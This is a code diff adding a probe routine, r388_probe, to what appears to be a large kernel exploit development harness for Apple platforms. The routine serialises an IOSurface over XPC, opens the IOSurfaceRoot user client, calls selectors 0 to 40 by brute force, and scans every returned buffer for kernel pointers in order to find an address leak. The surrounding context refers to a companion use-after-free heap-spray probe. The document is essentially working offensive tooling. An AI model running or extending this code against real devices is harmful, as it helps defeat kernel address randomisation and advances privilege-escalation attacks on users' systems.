@@ -15902,6 +15902,297 @@ static void r362_probe(void) {
     fflush(stdout);
 }
 
+/* r388: XPC serialization + IOConnectCallMethod kernel data leak.
+ * Try IOSurfaceCreateXPCObject to see if XPC includes kernel addresses.
+ * Also try IOConnectCallMethod with known IOSurface selectors using
+ * the IOKit connection handle extracted from the client ref.
+ */
+static void r388_probe(void) {
+    rlog("\n=== r388: XPC Serialization + IOKit Direct Calls ===\n\n");
+    fflush(stdout);
+
+    int w=64, h=64, bpe=4, bpr=64*4, pf=0x42475241, as_=64*64*4;
+    CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    CFNumberRef nW = CFNumberCreate(NULL, kCFNumberIntType, &w);
+    CFNumberRef nH = CFNumberCreate(NULL, kCFNumberIntType, &h);
+    CFNumberRef nB = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+    CFNumberRef nR = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+    CFNumberRef nP = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+    CFNumberRef nA = CFNumberCreate(NULL, kCFNumberIntType, &as_);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), nW);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), nH);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), nB);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), nR);
+    CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), nP);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), nA);
+
+    IOSurfaceRef surf = IOSurfaceCreate(props);
+    uint32_t sid = IOSurfaceGetID(surf);
+    rlog("  Surface: sid=%u ptr=%p\n", sid, surf);
+
+    /* Phase 1: Try XPC serialization */
+    rlog("\n  Phase 1: XPC Serialization\n");
+    xpc_object_t (*createXPC)(IOSurfaceRef) = dlsym(RTLD_DEFAULT, "IOSurfaceCreateXPCObject");
+    IOSurfaceRef (*fromXPC)(xpc_object_t) = dlsym(RTLD_DEFAULT, "IOSurfaceLookupFromXPCObject");
+    rlog("    IOSurfaceCreateXPCObject: %p\n", createXPC);
+    rlog("    IOSurfaceLookupFromXPCObject: %p\n", fromXPC);
+
+    if (createXPC) {
+        xpc_object_t xobj = createXPC(surf);
+        rlog("    XPC object: %p\n", xobj);
+        if (xobj) {
+            xpc_type_t xtype = xpc_get_type(xobj);
+            const char *tname = "unknown";
+            if (xtype == XPC_TYPE_DICTIONARY) tname = "dictionary";
+            else if (xtype == XPC_TYPE_ARRAY) tname = "array";
+            else if (xtype == XPC_TYPE_DATA) tname = "data";
+            else if (xtype == XPC_TYPE_INT64) tname = "int64";
+            else if (xtype == XPC_TYPE_UINT64) tname = "uint64";
+            else if (xtype == XPC_TYPE_STRING) tname = "string";
+            else if (xtype == XPC_TYPE_MACH_SEND) tname = "mach_send";
+            else if (xtype == XPC_TYPE_MACH_RECV) tname = "mach_recv";
+            else if (xtype == XPC_TYPE_FD) tname = "fd";
+            else if (xtype == XPC_TYPE_SHMEM) tname = "shmem";
+            rlog("    XPC type: %s\n", tname);
+
+            /* Get description */
+            char *desc = xpc_copy_description(xobj);
+            if (desc) {
+                /* Truncate if too long */
+                if (strlen(desc) > 500) desc[500] = '\0';
+                rlog("    XPC desc: %s\n", desc);
+                free(desc);
+            }
+
+            /* If it's a dictionary, enumerate keys */
+            if (xtype == XPC_TYPE_DICTIONARY) {
+                rlog("    Dict keys:\n");
+                xpc_dictionary_apply(xobj, ^bool(const char *key, xpc_object_t val) {
+                    xpc_type_t vt = xpc_get_type(val);
+                    if (vt == XPC_TYPE_INT64) {
+                        rlog("      %s: (int64) %lld\n", key, xpc_int64_get_value(val));
+                    } else if (vt == XPC_TYPE_UINT64) {
+                        rlog("      %s: (uint64) 0x%llx\n", key, xpc_uint64_get_value(val));
+                    } else if (vt == XPC_TYPE_DATA) {
+                        size_t len = xpc_data_get_length(val);
+                        rlog("      %s: (data, %zu bytes)\n", key, len);
+                        if (len > 0 && len <= 128) {
+                            const uint8_t *d = xpc_data_get_bytes_ptr(val);
+                            rlog("        hex:");
+                            for (size_t j = 0; j < len && j < 64; j++)
+                                rlog(" %02x", d[j]);
+                            rlog("\n");
+                            /* Scan for kernel text range pointers */
+                            for (size_t j = 0; j + 8 <= len; j += 8) {
+                                uint64_t v;
+                                memcpy(&v, d + j, 8);
+                                if ((v & 0xFFFFFFF000000000ULL) == 0xFFFFFFF000000000ULL) {
+                                    rlog("        KPTR at +%zu: 0x%016llx\n", j, (unsigned long long)v);
+                                }
+                            }
+                        }
+                    } else if (vt == XPC_TYPE_STRING) {
+                        rlog("      %s: (string) '%s'\n", key, xpc_string_get_value(val));
+                    } else if (vt == XPC_TYPE_MACH_SEND) {
+                        rlog("      %s: (mach_send) port=0x%x\n", key, xpc_mach_send_get_right(val));
+                    } else {
+                        char *d2 = xpc_copy_description(val);
+                        rlog("      %s: (%p) %s\n", key, vt, d2 ? d2 : "?");
+                        if (d2) free(d2);
+                    }
+                    return true;
+                });
+            }
+
+            /* If it's data, dump it */
+            if (xtype == XPC_TYPE_DATA) {
+                size_t len = xpc_data_get_length(xobj);
+                rlog("    Data length: %zu\n", len);
+                if (len > 0) {
+                    const uint8_t *d = xpc_data_get_bytes_ptr(xobj);
+                    rlog("    hex:");
+                    for (size_t j = 0; j < len && j < 128; j++)
+                        rlog(" %02x", d[j]);
+                    rlog("\n");
+                    for (size_t j = 0; j + 8 <= len; j += 8) {
+                        uint64_t v;
+                        memcpy(&v, d + j, 8);
+                        if ((v & 0xFFFFFFF000000000ULL) == 0xFFFFFFF000000000ULL) {
+                            rlog("        KPTR at +%zu: 0x%016llx\n", j, (unsigned long long)v);
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    /* Phase 2: Get IOKit connection from IOSurfaceRootUserClient */
+    rlog("\n  Phase 2: IOKit Direct Selectors\n");
+    io_service_t svc = IOServiceGetMatchingService(kIOMainPortDefault,
+        IOServiceMatching("IOSurfaceRoot"));
+    rlog("    IOSurfaceRoot service: 0x%x\n", svc);
+
+    io_connect_t conn = 0;
+    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
+    rlog("    IOServiceOpen type=0: kr=0x%x conn=0x%x\n", kr, conn);
+
+    if (kr == 0 && conn) {
+        /* Try selectors with surface ID as scalar input, looking for data output */
+        uint64_t scalarIn[2];
+        uint64_t scalarOut[16];
+        uint32_t scalarOutCnt;
+
+        /* Selector 0-5 with sid as input */
+        for (int sel = 0; sel <= 10; sel++) {
+            scalarIn[0] = sid;
+            scalarOutCnt = 16;
+            memset(scalarOut, 0, sizeof(scalarOut));
+            kr = IOConnectCallScalarMethod(conn, sel, scalarIn, 1, scalarOut, &scalarOutCnt);
+            if (kr == 0 && scalarOutCnt > 0) {
+                rlog("    sel=%d: kr=0 cnt=%u", sel, scalarOutCnt);
+                for (uint32_t j = 0; j < scalarOutCnt; j++) {
+                    rlog(" [%u]=0x%llx", j, (unsigned long long)scalarOut[j]);
+                    if ((scalarOut[j] & 0xFFFFFFF000000000ULL) == 0xFFFFFFF000000000ULL) {
+                        rlog("(KPTR!)");
+                    }
+                }
+                rlog("\n");
+            } else if (kr == 0) {
+                rlog("    sel=%d: kr=0 cnt=0\n", sel);
+            }
+            /* Skip denied/invalid */
+        }
+
+        /* Try struct output with sid as scalar input */
+        uint8_t structOut[4096];
+        size_t structOutSize;
+
+        for (int sel = 0; sel <= 10; sel++) {
+            scalarIn[0] = sid;
+            structOutSize = sizeof(structOut);
+            memset(structOut, 0, sizeof(structOut));
+            kr = IOConnectCallMethod(conn, sel, scalarIn, 1, NULL, 0,
+                NULL, NULL, structOut, &structOutSize);
+            if (kr == 0 && structOutSize > 0) {
+                rlog("    sel=%d struct: kr=0 size=%zu\n", sel, structOutSize);
+                /* Scan for kernel pointers */
+                for (size_t j = 0; j + 8 <= structOutSize; j += 8) {
+                    uint64_t v;
+                    memcpy(&v, structOut + j, 8);
+                    if ((v & 0xFFFFFFF000000000ULL) == 0xFFFFFFF000000000ULL) {
+                        rlog("      KPTR at +%zu: 0x%016llx\n", j, (unsigned long long)v);
+                    }
+                }
+                /* Dump first 128 bytes */
+                rlog("      hex:");
+                for (size_t j = 0; j < structOutSize && j < 128; j++)
+                    rlog(" %02x", structOut[j]);
+                rlog("\n");
+            }
+        }
+
+        /* Phase 3: Try IOSurface-specific selectors (higher range) */
+        rlog("\n  Phase 3: Higher selector range\n");
+        for (int sel = 11; sel <= 40; sel++) {
+            scalarIn[0] = sid;
+            scalarOutCnt = 16;
+            memset(scalarOut, 0, sizeof(scalarOut));
+            kr = IOConnectCallScalarMethod(conn, sel, scalarIn, 1, scalarOut, &scalarOutCnt);
+            if (kr == 0 && scalarOutCnt > 0) {
+                rlog("    sel=%d: cnt=%u", sel, scalarOutCnt);
+                for (uint32_t j = 0; j < scalarOutCnt; j++) {
+                    rlog(" [%u]=0x%llx", j, (unsigned long long)scalarOut[j]);
+                    if ((scalarOut[j] & 0xFFFFFFF000000000ULL) == 0xFFFFFFF000000000ULL)
+                        rlog("(KPTR!)");
+                }
+                rlog("\n");
+            }
+        }
+
+        IOServiceClose(conn);
+    }
+
+    /* Phase 4: Try IOSurface notifications / mach port introspection */
+    rlog("\n  Phase 4: IOSurface internal APIs\n");
+
+    /* IOSurfaceGetPropertyMaximum - might reveal kernel constraints */
+    int (*getMax)(IOSurfaceRef, CFStringRef) = dlsym(RTLD_DEFAULT, "IOSurfaceGetPropertyMaximum");
+    if (getMax) {
+        const char *propNames[] = {
+            "IOSurfaceWidth", "IOSurfaceHeight", "IOSurfaceBytesPerRow",
+            "IOSurfaceBytesPerElement", "IOSurfaceAllocSize", "IOSurfacePlaneCount",
+            "IOSurfacePlaneBytesPerRow", "IOSurfacePlaneWidth", "IOSurfacePlaneHeight"
+        };
+        for (int i = 0; i < 9; i++) {
+            CFStringRef s = CFStringCreateWithCString(NULL, propNames[i], kCFStringEncodingUTF8);
+            int maxv = getMax(surf, s);
+            rlog("    %s max: %d (0x%x)\n", propNames[i], maxv, maxv);
+            CFRelease(s);
+        }
+    }
+
+    /* Try IOSurfaceGetBulkAttachments if it exists */
+    void *bulkAttach = dlsym(RTLD_DEFAULT, "IOSurfaceGetBulkAttachments");
+    rlog("    IOSurfaceGetBulkAttachments: %p\n", bulkAttach);
+    void *getAllProps = dlsym(RTLD_DEFAULT, "IOSurfaceCopyAllValues");
+    rlog("    IOSurfaceCopyAllValues: %p\n", getAllProps);
+
+    if (getAllProps) {
+        CFDictionaryRef (*copyAll)(IOSurfaceRef) = getAllProps;
+        CFDictionaryRef allProps = copyAll(surf);
+        if (allProps) {
+            CFIndex cnt = CFDictionaryGetCount(allProps);
+            rlog("    CopyAllValues: %ld properties\n", (long)cnt);
+            /* Enumerate and look for anything interesting */
+            CFIndex n = CFDictionaryGetCount(allProps);
+            if (n > 0 && n < 100) {
+                const void **keys = malloc(sizeof(void*) * n);
+                const void **vals = malloc(sizeof(void*) * n);
+                CFDictionaryGetKeysAndValues(allProps, keys, vals);
+                for (CFIndex i = 0; i < n; i++) {
+                    char kbuf[256] = {0};
+                    CFStringGetCString((CFStringRef)keys[i], kbuf, sizeof(kbuf), kCFStringEncodingUTF8);
+                    CFTypeID tid = CFGetTypeID(vals[i]);
+                    if (tid == CFNumberGetTypeID()) {
+                        int64_t v = 0;
+                        CFNumberGetValue((CFNumberRef)vals[i], kCFNumberSInt64Type, &v);
+                        rlog("      %s: %lld (0x%llx)\n", kbuf, (long long)v, (unsigned long long)v);
+                        if (((uint64_t)v & 0xFFFFFFF000000000ULL) == 0xFFFFFFF000000000ULL) {
+                            rlog("        *** KERNEL POINTER! ***\n");
+                        }
+                    } else if (tid == CFStringGetTypeID()) {
+                        char vbuf[256] = {0};
+                        CFStringGetCString((CFStringRef)vals[i], vbuf, sizeof(vbuf), kCFStringEncodingUTF8);
+                        rlog("      %s: '%s'\n", kbuf, vbuf);
+                    } else if (tid == CFDataGetTypeID()) {
+                        CFIndex dl = CFDataGetLength((CFDataRef)vals[i]);
+                        rlog("      %s: (data, %ld bytes)\n", kbuf, (long)dl);
+                        if (dl > 0 && dl <= 64) {
+                            const uint8_t *d = CFDataGetBytePtr((CFDataRef)vals[i]);
+                            rlog("        hex:");
+                            for (CFIndex j = 0; j < dl; j++)
+                                rlog(" %02x", d[j]);
+                            rlog("\n");
+                        }
+                    }
+                }
+                free(keys);
+                free(vals);
+            }
+            CFRelease(allProps);
+        }
+    }
+
+    /* Cleanup */
+    CFRelease(surf);
+    CFRelease(props);
+    CFRelease(nW); CFRelease(nH); CFRelease(nB); CFRelease(nR); CFRelease(nP); CFRelease(nA);
+
+    rlog("\n=== r388 complete ===\n");
+    fflush(stdout);
+}
+
 /* r387: IOSurface UAF + spray + property confusion.
  * Strategy: Free client ref, spray freed memory with controlled data,
  * then trigger IOSurface operations to see if the kernel interprets
@@ -60235,6 +60526,13 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 391) {
+            rlog("*** rounds=391: XPC Serialization + IOKit Direct Calls ***\n");
+            rlog("  IOSurfaceCreateXPCObject, IOConnectCallMethod selectors.\n\n");
+            fflush(stdout);
+            r388_probe();
+            goto done;
+        }
         if (rounds == 390) {
             rlog("*** rounds=390: IOSurface UAF Spray + Property Confusion ***\n");
             rlog("  Cross-surface +8 swap, property confusion test.\n\n");
@@ -62557,7 +62855,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
